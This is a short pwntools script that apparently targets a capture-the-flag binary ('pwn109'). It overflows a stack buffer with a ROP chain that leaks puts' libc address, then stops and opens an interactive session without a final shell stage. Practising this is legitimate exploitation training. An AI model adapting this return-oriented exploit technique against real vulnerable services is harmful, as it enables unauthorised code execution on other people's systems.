


```python

"""
NO PIE
NO stack canary
can overflow 
leak via puts
"""

from pwn import *

context.log_level = 'info'
context.binary = "./pwn109-1644300507645.pwn109"
elf = context.binary

def start():
    if args.R:
        return remote("10.49.173.178", 9009)
    elif args.G:
        return gdb.debug(elf.path, gdbscript='''
            break main
            b *0x000000000040122a
        ''')
    else:
        return process(elf.path)

def exploit(p):
    # First leak puts address
    payload = b"A" * 40
    payload += p64(0x00000000004012a3)  # pop rdi; ret
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.sym['main']) 
    
    p.recvuntil(b"Go ahead")
    p.recvline()
    p.sendline(payload)
    
    # Read the leaked address properly
    p.recvline()  # Skip the "Go ahead" line
    leak = p.recvline().strip()
    
    # Pad to 8 bytes and unpack
    if len(leak) < 8:
        leak = leak.ljust(8, b'\x00')
    leak_address = u64(leak)
    print(f"[*] Leaked puts@GLIBC Address: {hex(leak_address)}")
    
    p.recvuntil(b"Go ahead")
    p.recvline()
    
    p.interactive()

if __name__ == '__main__':
    io = start()
    exploit(io)
```
